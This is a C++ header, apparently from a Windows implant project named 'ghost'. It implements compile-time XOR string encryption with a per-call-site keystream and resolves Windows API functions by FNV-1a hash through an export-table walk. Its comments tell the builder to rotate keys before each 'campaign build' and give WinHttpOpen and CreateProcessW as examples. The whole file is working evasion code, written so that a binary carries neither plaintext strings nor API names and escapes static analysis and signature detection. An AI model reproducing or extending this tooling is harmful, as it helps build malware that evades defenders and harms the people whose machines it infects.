// obfuscate.hpp — Compile-time XOR string obfuscation + PEB-based API hash resolution
//
// USAGE:
//   XS("hello")          -> XorStr<N, ID> decrypts on first .str() / implicit cast
//   XSW(L"hello")        -> XorStrW<N, ID> wide variant
//   FNV("WinHttpOpen")   -> uint32_t compile-time hash
//   HashProc(hMod, hash) -> FARPROC resolved via PEB export walk, no name string
//   HASHPROC(mod, Name)  -> typed pointer shorthand
//
// ENCRYPTION: every literal gets its own splitmix64 keystream, seeded from the
// build salt, the rotating key and a per-call-site counter (__COUNTER__). All
// of it is evaluated at compile time — no plaintext reaches the binary and no
// runtime key material exists to recover. Identical literals at different call
// sites produce different ciphertext, and one recovered keystream decrypts
// exactly one string. Rotate GHOST_SALT and GHOST_K0..K3 before each build.
//
// STRING LIFETIME: str() decodes from the retained ciphertext into a scratch
// buffer on every call, so it is idempotent — calling it twice, or reading the
// value through the conversion operator afterwards, returns the same string
// (the previous design XORed the buffer in place and returned garbage on a
// second call). The destructor wipes the scratch buffer.
//
#pragma once
#include "ghostcore.hpp"   // keystream primitives, also unit-tested on Linux
#include <windows.h>
#include <cstdint>
#include <cstring>

// ─── Build salt + rotating key — defined in ghostcore.hpp ───────────────
// GHOST_SALT, GHOST_K0..K3, the seed derivation and the splitmix64 stream live
// in include/ghostcore.hpp (namespace ghost) so tests/test_core.cpp can cover
// them on a plain runner. Rotate the salt and key before each campaign build.

// ─── Compile-time FNV-1a 32-bit hash ────────────────────────────────────────
constexpr uint32_t fnv1a_impl(const char* s, uint32_t h) {
    return (*s == '\0') ? h : fnv1a_impl(s + 1, (h ^ static_cast<uint8_t>(*s)) * 0x01000193u);
}
constexpr uint32_t fnv1a(const char* s) {
    return fnv1a_impl(s, 0x811c9dc5u);
}
#define FNV(s) (fnv1a(s))

// ─── Narrow XorStr<N, ID> ────────────────────────────────────────────────────────
// Constructed from the ciphertext, never from the plaintext: the macros below
// bind a `constexpr` array built by ghost::MakeCipher, which forces the XOR to
// happen at compile time. See ghostcore.hpp for why that is a correctness
// requirement rather than a micro-optimisation.
template<size_t N, uint32_t ID>
struct XorStr {
    char          cipher[N];   // immutable ciphertext
    mutable char  buf[N];      // decoded scratch, recomputed on every str()

    explicit XorStr(const std::array<char, N>& c) : cipher{}, buf{} {
        for (size_t i = 0; i < N; ++i) cipher[i] = c[i];
    }

    const char* str() const {
        // Decoding always starts from the retained ciphertext, so str() is
        // idempotent: calling it twice, or reading through the conversion
        // operator after a .str(), returns the same string instead of
        // re-encrypting what the previous call left in the buffer. The opaque
        // zero keeps the decode opaque to the optimiser (ghostcore.hpp).
        for (size_t i = 0; i < N - 1; ++i)
            buf[i] = static_cast<char>(static_cast<unsigned char>(cipher[i]) ^
                                       ghost::ghost_stream(ghost::ghost_seed(ID), i) ^
                                       ghost::opaque_zero);
        buf[N - 1] = '\0';
        return buf;
    }

    operator const char*() const { return str(); }

    ~XorStr() {
        volatile char* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = '\0';
    }

    XorStr(const XorStr&) = delete;
    XorStr& operator=(const XorStr&) = delete;
};

// One __COUNTER__ expansion per call site, shared by the cipher and the decoder
// so both sides derive the same keystream. The expression yields the object (as
// before this change), so `auto s = XSW(...)` still binds an object with its own
// buffer and `.str()`/implicit conversion behave exactly as they did; the object
// is a prvalue materialised in the enclosing full-expression.
#define XS(literal)                                                              \
    ([]{                                                                         \
        constexpr uint32_t ghost_id = __COUNTER__;                               \
        constexpr auto ghost_cipher = ghost::MakeCipher<sizeof(literal), ghost_id>(literal); \
        return XorStr<sizeof(literal), ghost_id>(ghost_cipher);                  \
    }())

// ─── Wide XorStrW<N, ID> ─────────────────────────────────────────────────────────
template<size_t N, uint32_t ID>
struct XorStrW {
    wchar_t          cipher[N];
    mutable wchar_t  buf[N];

    explicit XorStrW(const std::array<wchar_t, N>& c) : cipher{}, buf{} {
        for (size_t i = 0; i < N; ++i) cipher[i] = c[i];
    }

    const wchar_t* str() const {
        for (size_t i = 0; i < N - 1; ++i)
            buf[i] = static_cast<wchar_t>(static_cast<unsigned>(cipher[i]) ^
                                          ghost::ghost_stream_w(ghost::ghost_seed(ID), i) ^
                                          ghost::opaque_zero);
        buf[N - 1] = L'\0';
        return buf;
    }

    operator const wchar_t*() const { return str(); }

    ~XorStrW() {
        volatile wchar_t* p = buf;
        for (size_t i = 0; i < N; ++i) p[i] = L'\0';
    }

    XorStrW(const XorStrW&) = delete;
    XorStrW& operator=(const XorStrW&) = delete;
};

#define XSW(literal)                                                             \
    ([]{                                                                         \
        constexpr uint32_t ghost_id = __COUNTER__;                               \
        constexpr auto ghost_cipher =                                            \
            ghost::MakeCipherW<sizeof(literal) / sizeof(wchar_t), ghost_id>(literal); \
        return XorStrW<sizeof(literal) / sizeof(wchar_t), ghost_id>(ghost_cipher); \
    }())

// ─── PEB-based API hash resolution ──────────────────────────────────────────
// Walks the loaded module's export table and compares FNV-1a(name) against
// targetHash. Zero string comparison in the binary — only hashes.
//
// Forwarder exports (e.g. ole32!CoCreateInstance → "combase.CoCreateInstance"
// on Win10/11) are pointers to an ASCII string, NOT to code. Calling one
// executes a data page → instant ACCESS_VIOLATION. When the matched RVA falls
// inside the export directory, resolve the forwarder target module and
// recurse. Depth-capped against forwarder cycles.
inline FARPROC HashProc(HMODULE hMod, uint32_t targetHash, int depth = 0) {
    if (!hMod || depth > 4) return nullptr;
    auto base = reinterpret_cast<const uint8_t*>(hMod);

    auto dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    auto nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    auto& expDataDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!expDataDir.VirtualAddress) return nullptr;

    auto exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(
        base + expDataDir.VirtualAddress);

    auto names    = reinterpret_cast<const DWORD*>(base + exp->AddressOfNames);
    auto ordinals = reinterpret_cast<const WORD*> (base + exp->AddressOfNameOrdinals);
    auto funcs    = reinterpret_cast<const DWORD*>(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(base + names[i]);
        if (fnv1a(name) == targetHash) {
            DWORD fnRva = funcs[ordinals[i]];

            // Forwarder: RVA points into the export directory itself.
            if (fnRva >= expDataDir.VirtualAddress &&
                fnRva <  expDataDir.VirtualAddress + expDataDir.Size) {
                const char* fwd = reinterpret_cast<const char*>(base + fnRva);
                char modName[64];
                size_t j = 0;
                while (fwd[j] && fwd[j] != '.' && j < sizeof(modName) - 1) {
                    modName[j] = fwd[j];
                    ++j;
                }
                if (fwd[j] != '.' || j == 0) return nullptr; // malformed / #ordinal form
                modName[j] = '\0';
                HMODULE hTarget = GetModuleHandleA(modName);
                if (!hTarget) hTarget = LoadLibraryA(modName);
                if (!hTarget) return nullptr;
                return HashProc(hTarget, fnv1a(fwd + j + 1), depth + 1);
            }

            return reinterpret_cast<FARPROC>(
                const_cast<uint8_t*>(base + fnRva));
        }
    }
    return nullptr;
}

// Typed shorthand: HASHPROC(hKernel32, CreateProcessW)
// Returns a correctly typed function pointer, no cast needed at call site.
#define HASHPROC(mod, name) \
    reinterpret_cast<decltype(&name)>(HashProc((mod), FNV(#name)))
